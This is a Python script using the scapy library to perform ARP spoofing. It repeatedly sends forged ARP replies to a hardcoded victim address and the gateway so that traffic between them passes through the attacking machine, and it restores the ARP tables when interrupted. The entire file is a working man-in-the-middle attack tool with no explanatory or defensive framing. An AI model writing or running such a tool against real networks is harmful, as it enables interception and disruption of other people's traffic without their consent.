import scapy.all as scapy
import time


def get_mac(client_ip):
    arp_request_client = scapy.ARP(pdst=client_ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast_client = broadcast / arp_request_client
    answered_list = []
    (answered_list, unanswered) = scapy.srp(arp_request_broadcast_client, timeout=1, verbose=False)
    for element in answered_list:
        return element[1].hwsrc


def spoof(client_ip, router_ip):
    client_mac = get_mac(client_ip)
    router_mac = get_mac(router_ip)

    packet_to_victim = scapy.ARP(op=2, pdst=client_ip, hwdst=client_mac, psrc=router_ip)
    scapy.send(packet_to_victim, verbose=False)
    packet_to_router = scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=client_ip)
    scapy.send(packet_to_router, verbose=False)


def restore(client_ip, router_ip):
    client_mac = get_mac(client_ip)
    router_mac = get_mac(router_ip)

    packet_to_victim = scapy.ARP(op=2, pdst=client_ip, hwdst=client_mac, psrc=router_ip, hwsrc=router_mac)
    scapy.send(packet_to_victim, count=4, verbose=False)
    packet_to_router = scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=client_ip, hwsrc=client_mac)
    scapy.send(packet_to_router, count=4, verbose=False)


packet_no = 2
try:
    while True:
        print("[+] Packets Sent : " + str(packet_no))
        spoof("192.168.1.14", "192.168.1.1")
        time.sleep(1)
        packet_no = packet_no + 2;

except KeyboardInterrupt:
    print("[+] Detected CTRL + C \n Restoring ARP table  \nQuitting.......")
    restore("192.168.1.14", "192.168.1.1")

